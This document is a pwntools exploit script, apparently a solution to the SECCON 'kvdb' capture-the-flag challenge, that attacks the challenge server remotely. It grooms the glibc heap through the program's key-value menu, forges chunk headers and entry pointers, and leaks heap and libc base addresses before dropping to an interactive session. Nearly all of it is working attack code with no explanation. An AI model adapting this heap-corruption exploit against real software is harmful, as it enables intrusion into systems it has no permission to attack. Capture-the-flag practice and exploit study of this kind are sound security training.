from pwn import *

context.log_level = 'debug'
context.aslr = False
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

binary = ELF('./kvdb')
libc = ELF('./libc.so.6')  # beware of 2.32 safe-linking

IP, PORT = 'kvdb.chal.seccon.jp', 17368
DEBUG = False
if DEBUG:
    p = process(['./ld.so', './kvdb'], env={'LD_PRELOAD': './libc.so.6'})
    #p = process('./kvdb')
else:
    p = remote(IP, PORT)

def menu(sel, key):
    p.sendlineafter('> ', str(sel))
    p.sendlineafter('Key : ', key)

def put(key, data):
    menu(1, key)
    p.sendlineafter('Size : ', str(len(data)))
    p.sendafter('Data : ', data)

def get(key):
    menu(2, key)
    p.recvuntil('\n---- data ----\n')
    return p.recvuntil('\n--------------\n\n', True)

def delete(key):
    menu(3, key)

def dbg():
    if DEBUG:
        gdb.attach(p, gdbscript='file ./kvdb\n')
        raw_input()

# pre-allocate 0x30 chunks
load = ['a', 'b', 'c', 'd', 'e', 'f']  # 0xa
for c in load:
    put(c, c)
for c in load:
    delete(c)

# (cap, inuse, actual inuse)
put('a', 'a'*0x400)  # 0x90 tcached, (#1 0x800, 0x40c, 0x40c)
put('b', 'b'*0x300)  # (#1 0x800, 0x70c, 0x70c)
delete('b')  # overwrite target (#1 0x800, 0x70c, 0x40c)
put('c', 'c'*0x300)  # free #1 0x800, (#2 0x800, 0x70c, 0x70c)
delete('c')  # (#2 0x800, 0x70c, 0x40c)

# split 0x30 from #1 0x800
# consolidate #2 0x800 w/ free #1 (chunksz 0x810+0x810-0x30 == 0xff0)
put('z', 'z'*0x100)  # (#3 0x800, 0x50e, 0x50e)
delete('z')  # (#3 0x800, 0x50e, 0x40e)
delete('a')  # (#3 0x800, 0x50e, 0xe)
put('d', 'd'*0x200)  # (#3 0x800, 0x70e, 0x20e)
delete('d')  # (#3 0x800, 0x70e, 0xe)

# split 0x400 from consolidated #1 & #2 (chunk @ 0x155555556470)
put('e', 'e'*0x100) # (#4 0x400, 0x10e, 0x10e)

# b's e->data == mp.base + mp.inuse
put('f', 'f'*0x2ef)  # (#4 0x400, 0x3fd, 0x3fd)

# b @ 0x15555555685c
# top chunk @ 0x155555556880, size 0x1f391
put('b', 'b'*0x2c + p64(0x1f391) + 'b'*0x20)

# overwritable from 'b'
put('[', 'y')  # (#4 0x400, 0x400, 0x400)

leak = get('b')
heap = u64(leak[0x44:0x4c]) - 0x87d
log.success('heap: {:016x}'.format(heap))
assert heap & 0xfff == 0

# store the goodies aside
delete('[')  # (#4 0x400, 0x400, 0x3ff)
delete('b')

put('x1', 'x'*0xfc)   # (0x800, 0x4fe, 0x4fe)
delete('x1')          # (0x800, 0x4fe, 0x2fe)
put('x2', 'x'*0x1fd)  # (0x800, 0x6fe, 0x4fe), consolidation guard
delete('x2')          # (0x800, 0x6fe, 0x2fe)
delete('f')           # (0x800, 0x6fe, 0x10e)
delete('e')           # (0x800, 0x6fe, 0xe)
put('x3', 'x'*0x102)  # (0x400, 0x801 -> 0x11b, 0x11b)
put('a', 'a'*0x2e5)   # (#4 0x400, 0x400, 0x400)

"""
0x155555556880:	0x6262626262626262	0x0000000000000031 <= [
0x155555556890:	0x0002b60000000000	0x0000000000000001
0x1555555568a0:	0x0000155555556480	0x000015555555687f
0x1555555568b0:	0x0000000000000000	0x0000000000000031
0x1555555568c0:	0x005979ee00000000	0x00000000000000fc
0x1555555568d0:	0x0000155555556490	0x0000155555556cf2
0x1555555568e0:	0x0000000000000000	0x0000000000000811 <= unsorted bin
0x1555555568f0:	0x0000155555515c00	0x0000155555515c00
"""

payload  = 'b'*0x2c + p64(0x31)
payload += p32(1) + p32(0x0002b600) + p64(8)
payload += p64(heap + 0x48d) + p64(heap + 0x8f0)  # &("y\0"[1]), unsorted bin
put('b', payload)
delete('b')

put('c', 'c')        # (0x800, 0x408, ?)
delete('x3')         # (0x800, 0x408, ?)
delete('a')          # (0x800, 0x408, ?)
put('e', 'x'*0x3f8)
delete('e')          # (0x800, 0x800, ?)

put('x4', '[\0')      # (#4 0x400, 0x26, 0x26)
put('a', 'a'*0x3da)   # (#4 0x400, 0x400, 0x400)

payload  = 'b'*0x2c + p64(0x31)
payload += p32(1) + p32(0x0002b600) + p64(8)
payload += p64(heap + 0x4a4)  # "[\0"
put('b', payload)
delete('b')

libc.address = u64(get('[')) - 0x1bec00
log.success('libc: {:016x}'.format(libc.address))
assert libc.address & 0xfff == 0

# mp: x/4gx 0x15555551e000+(void*)&mp
dbg()

p.interactive()